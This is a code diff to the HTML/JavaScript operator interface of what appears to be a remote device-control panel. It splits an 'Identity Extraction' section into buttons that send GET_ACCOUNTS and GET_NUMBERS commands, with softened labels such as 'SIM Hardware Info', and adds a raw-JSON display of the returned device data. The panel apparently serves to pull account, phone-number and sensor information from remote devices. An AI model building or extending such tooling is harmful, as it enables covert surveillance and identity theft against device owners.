@@ -462,8 +462,11 @@
                     <label class="cmd-label">Identity Extraction</label>
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('GET_ACCOUNTS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Accounts</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('GET_NUMBERS')">SIMs</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Device Accounts</button>
+                    </div>
+                    <div class="input-wrap" style="margin-top:5px">
+                        <button class="btn-tag" onclick="tagCmd('GET_NUMBERS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_NUMBERS')">?</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('GET_NUMBERS')">SIM Hardware Info</button>
                     </div>
                 </div>
                 <div class="cmd-row"><label class="cmd-label">Environmental Audit (Sensors)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SENSORS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SENSORS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_SENSORS')">Sample Physical State</button></div></div>
@@ -1213,6 +1216,11 @@
                         });
                         dataHtml += `</div>`;
                     }
+                }
+
+                // Fallback: If there is result data but no specific HTML built yet, show raw JSON
+                if (!dataHtml && c.result_data) {
+                    dataHtml = `<div style="margin-top:10px; padding:10px; background:rgba(0,0,0,0.3); border:1px solid #333; overflow:auto;"><pre style="margin:0; font-size:0.6rem; color:var(--success);">${JSON.stringify(c.result_data, null, 2)}</pre></div>`;
                 }
 
                 return `
